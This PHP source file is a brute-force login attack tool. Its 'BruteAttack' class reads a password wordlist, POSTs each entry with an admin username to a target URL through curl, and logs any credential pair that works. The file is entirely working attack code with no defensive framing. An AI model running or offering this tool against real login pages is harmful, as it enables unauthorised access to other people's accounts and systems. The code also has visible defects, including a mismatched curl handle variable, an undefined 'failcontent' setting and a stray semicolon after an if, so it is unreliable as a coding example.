<?php

if (empty(BruteAttack::$settings)) {
	BruteAttack::init(array(
		'Parameter1'  => NULL,
		'Parameter2'  => NULL,
		'Parameter3'  => NULL,
		'timezone'    => 'Europe/Amsterdam', // Time zone for the output file.
		'wordlist'    => 'wordlist/wordlist.txt', // Path to the wordlist.
		'outputfile'  => 'logs/output.txt', // Output file where the matching combo('s) will be stored in.
		'url'		  => '', // Target URL.
		'username'    => '', // Must be a known constant for the attack to work.
		'admin_name'  => 'admin', // Either admin or a known constant.
		'password'	  => '' 
	));
}

class BruteAttack 
{
	/**
	 * A setup array to hold target details and build an attack. Example in brute.config.php 
	 * Required indices: wordlist/outputfile/timezone/url/username/admin_name/password
	 */
	public static $settings = array();

	/**
	 * A variable to hold the curl handle.
	 * @var string
	 */ 
	private $curl_handle;

	/**
	 * An array holding the details of the attack. Used in BruteAttack::attack()
	 * @param array data
	 */
	private static $data = array();


	/**
	 * An array required to prime the attack - holds settings
	 * @param array settings
	 * @return void
	 */
	public static function init(array $settings) : void
	{
		self::$settings = $settings;
	}

	/**
     * scans a .txt file containing a list of possible password strings, the file
     * 'wordlist.txt' included with this application contain 1,000,000 entries.
     * To add a new/different list of strings, specify the filepath in config.php.
     * @return array
     */
	private function scanFile() : array
	{
		if (!file_exists(self::$settings['wordlist'])) {
			trigger_error('File doesn\'t exist');
		} else {
			$file = fopen(self::$settings['wordlist'], 'r');
			$file = fread($file, filesize(self::$settings['wordlist']));
			$file = str_replace(" ", "", $file);
			$file = str_replace("\r", "", $file);
			return preg_split("(\n)", $file);
		}
	}	


	/**
	 * @param string data
	 */
	private function logAttack($data)
	{
		if (!file_exists(self::$settings['outputfile'])) {
			trigger_error('Output file doesn\'t exist');
		}

		date_default_timezone_set(self::$settings['timezone']);
		$date = date('m/d/Y h:i:s a', time());

		if(file_put_contents(self::$settings['outputfile'],"[{$date}] Server: " .  $data . "\n", FILE_APPEND)) {
			return true;
		} else {
			return false;
		}
	}


	/*
	* @param {string} url
	* @param {boolean} mode
	*/
	public function checkURL($url, $mode = true)
	{
		if(!filter_var($url, FILTER_VALIDATE_URL)) {
			if ($mode) {
				$this->logAttack('Failed to filter ' . $url . ' as a valid URL.');
			}
			return false;
		}

		$this->curl_handle = curl_init($url);
		curl_setopt($this->curl_handle, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($this->curl_handle, CURLOPT_NOBODY, true);
		curl_setopt($this->curl_handle, CURLOPT_HEADER, true);
		curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, true);

		$resp = curl_exec($this->curl_handle);

		if($resp) {
			return true;
		} else {
			if($mode){
				$this->logAttack($url . ' is not a valid URL, can\'t connect.');
			}
			return false;
		}
	}


	/*
	* @param {string} url
	* @param {boolean} mode
	*/
	public function checkPath($url, $mode = true)
	{
		$this->curl = curl_init($url);
		curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, true);
		$resp = curl_exec($this->curl_handle);
		$code = curl_getinfo($this->curl_handle, CURLINFO_HTTP_CODE);

		if($code == 404) {
			if($mode) {
				$this->logAttack($url . ' is not found on the website (404).');
			}
		    return false;
		} elseif($code == 403) {
			if($mode) {
				$this->logAttack($url . 'is a forbidden page on the website (403)');
			}
			return false;
		} else {
			return true;
		}
		curl_close($this->curl_handle);
	}


	public function attack()
	{
		if(!$this->checkURL(self::$settings['url'])) {
			return 'Can\'t connect to ' . self::$settings['url'] . '. Check the output file (' . self::$settings['outputfile'] . ')';
		}

		if(!$this->checkPath(self::$settings['url'])) {
			return 'Can\'t connect to ' . self::$settings['url'] . '. Check the output file (' . self::$settings['outputfile'] . ')';
		}
		
		
		foreach($this->scanFile() as $l => $f) {
			self::$data[self::$settings['username']] = self::$settings['admin_name'];
			self::$data[self::$settings['password']] = $f;

			$this->curl_handle = curl_init(self::$settings['url']);
			curl_setopt($this->curl_handle, CURLOPT_POST, true);
			curl_setopt($this->curl_handle, CURLOPT_POSTFIELDS, http_build_query(self::$data));
			curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, true);

			if (curl_exec($this->curl_handle) != self::$settings['failcontent']) {
				if($this->logAttack('Found a matching combination (' . self::$settings['admin_name'] . ':' . $f .') in line ' . $l . ' of ' . self::$settings['wordlist']));
				return "Found a combo. Check the output log.";
			} 
		}	
		curl_close($this->curl_handle);
	}
}